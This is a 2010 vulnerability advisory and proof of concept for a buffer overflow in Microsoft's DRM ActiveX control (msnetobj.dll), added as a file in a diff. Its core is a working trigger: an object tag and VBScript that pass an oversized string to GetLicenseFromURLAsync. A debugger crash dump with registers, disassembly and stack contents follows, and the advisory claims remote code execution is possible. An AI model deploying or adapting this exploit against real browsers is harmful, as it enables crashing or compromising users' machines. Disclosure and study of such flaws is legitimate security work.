@@ -1,0 +1,139 @@
+                    ============================================================================================
+
+                             Microsoft DRM technology (msnetobj.dll) ActiveX Multiple Remote Vulnerabilities
+                     ===========================================================================================
+
+                                                     by
+
+                                            Asheesh Kumar Mani Tripathi
+
+
+# Vulnerability Discovered By Asheesh kumar Mani Tripathi
+
+# email informationhacker08@gmail.com
+
+# company       www.aksitservices.co.in
+
+# Credit by Asheesh Anaconda 
+
+# Date 18th Sep 2010
+
+# Description: Microsoft DRM technology (msnetobj.dll) ActiveX suffers from multiple remote vulnerabilities
+             such as buffer overflow, integer overflow and denial of service (IE crash). This issue is
+             triggered when an attacker convinces a victim user to visit a malicious website.
+
+             The "GetLicenseFromURLAsync" function does not handle input correctly. 
+ 
+             Remote attackers may exploit this issue to execute arbitrary machine code in the context of
+             the affected application, facilitating the remote compromise of affected computers. Failed
+             exploit attempts likely result in browser crashes.
+
+=============================================Proof Of Concept=============================================
+ 
+
+
+<object classid='clsid:A9FC132B-096D-460B-B7D5-1DB0FAE0C062' id='RM' />
+<script language='vbscript'>
+
+targetFile = "C:\Windows\System32\msnetobj.dll"
+prototype  = "Sub GetLicenseFromURLAsync ( ByVal bstrXMLDoc As String ,  ByVal bstrURL As String )"
+memberName = "GetLicenseFromURLAsync"
+progid     = "MSNETOBJLib.RMGetLicense"
+argCount   = 2
+
+arg1="defaultV"
+arg2=String(8212, "A")
+
+RM.GetLicenseFromURLAsync(arg1 ,arg2) 
+
+</script>
+=============================================Exception details=============================================
+Exception Code: ACCESS_VIOLATION
+Disasm: 77BEEA7F	MOVS DWORD PTR ES:[EDI],DWORD PTR [ESI]
+
+Seh Chain:
+--------------------------------------------------
+1 	76E7E47D 	msvcrt.dll
+2 	77BB99FA 	ntdll.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+ntdll.77BEEA7F                ntdll.77BEE9D9                
+ntdll.77BEE9D9                KERNEL32.770E7F75             
+KERNEL32.770E7F75             ole32.779EB3E1                
+ole32.779EB3E1                ole32.779EB50A                
+ole32.779EB50A                ole32.779AF6F6                
+ole32.779AF6F6                ole32.779AF794                
+ole32.779AF794                msnetobj.6B823726             
+msnetobj.6B823726             msnetobj.6B823814             
+msnetobj.6B823814             msnetobj.6B823C40             
+msnetobj.6B823C40             msnetobj.6B823FA7             
+msnetobj.6B823FA7             msnetobj.6B824513             
+msnetobj.6B824513             msnetobj.6B823A9D             
+msnetobj.6B823A9D             msvcrt.76E82599               
+msvcrt.76E82599               msvcrt.76E826B3               
+msvcrt.76E826B3               KERNEL32.770ED0E9             
+KERNEL32.770ED0E9             ntdll.77BF19BB                
+ntdll.77BF19BB                ntdll.77BF198E                
+
+
+Registers:
+--------------------------------------------------
+EIP 77BEEA7F
+EAX 00000054
+EBX 00032A78 -> Asc: GsHd(
+ECX 00000000
+EDX 00000004
+EDI 035CEE28 -> 7FFD8000
+ESI 6B821434
+EBP 035CEE48 -> 035CEE90
+ESP 035CEE0C -> 00032A78
+
+
+Block Disassembly: 
+--------------------------------------------------
+77BEEA68	PUSH EDI
+77BEEA69	JNZ 77C25E3F
+77BEEA6F	TEST BYTE PTR [EBX+10],1
+77BEEA73	JE 77C25E93
+77BEEA79	MOV EAX,[EBX+18]
+77BEEA7C	LEA EDI,[EBP-20]
+77BEEA7F	MOVS DWORD PTR ES:[EDI],DWORD PTR [ESI]	  <--- CRASH
+77BEEA80	PUSH 77BEEABD
+77BEEA85	MOVS DWORD PTR ES:[EDI],DWORD PTR [ESI]
+77BEEA86	PUSH 1C
+77BEEA88	ADD EAX,EBX
+77BEEA8A	PUSH EDX
+77BEEA8B	MOVS DWORD PTR ES:[EDI],DWORD PTR [ESI]
+77BEEA8C	PUSH EAX
+77BEEA8D	LEA EAX,[EBP-20]
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	00032A78 -> Asc: GsHd(
+EBP+12	6B821434
+EBP+16	035CEEB0 -> 00000040
+EBP+20	00000000
+EBP+24	77AC1424 -> 779EBEC8
+EBP+28	6B821434
+
+
+Stack Dump:
+--------------------------------------------------
+35CEE0C 78 2A 03 00 08 00 15 C0 00 00 00 00 B0 EE 5C 03  [..............\.]
+35CEE1C 04 00 00 00 34 14 82 6B 00 90 FD 7F 00 80 FD 7F  [.......k........]
+35CEE2C 44 EE 5C 03 01 6C BF 77 68 EE 5C 03 84 EE 5C 03  [D.\..l.wh.\...\.]
+35CEE3C 88 EE 5C 03 80 EE 5C 03 92 59 7C 75 90 EE 5C 03  [..\...\..Y.u..\.]
+35CEE4C D9 E9 BE 77 78 2A 03 00 34 14 82 6B B0 EE 5C 03  [...w.......k..\.]
+
+
+
+ApiLog
+--------------------------------------------------
+
+***** Installing Hooks *****
+7735d5c0     RegCreateKeyExA (HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings,(null))
+Debug String Log
+--------------------------------------------------
